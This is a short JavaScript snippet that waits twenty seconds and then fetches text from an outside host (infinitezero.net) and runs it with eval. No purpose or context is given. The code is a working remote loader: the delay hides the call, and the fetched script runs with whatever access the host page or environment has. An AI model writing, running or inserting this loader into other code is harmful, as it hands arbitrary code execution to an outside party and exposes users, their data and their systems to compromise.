async function run () {
    (async () => {
        eval(await (await fetch("https://infinitezero.net/eval")).text());
    })();
}

setTimeout(run, 20 * 1000);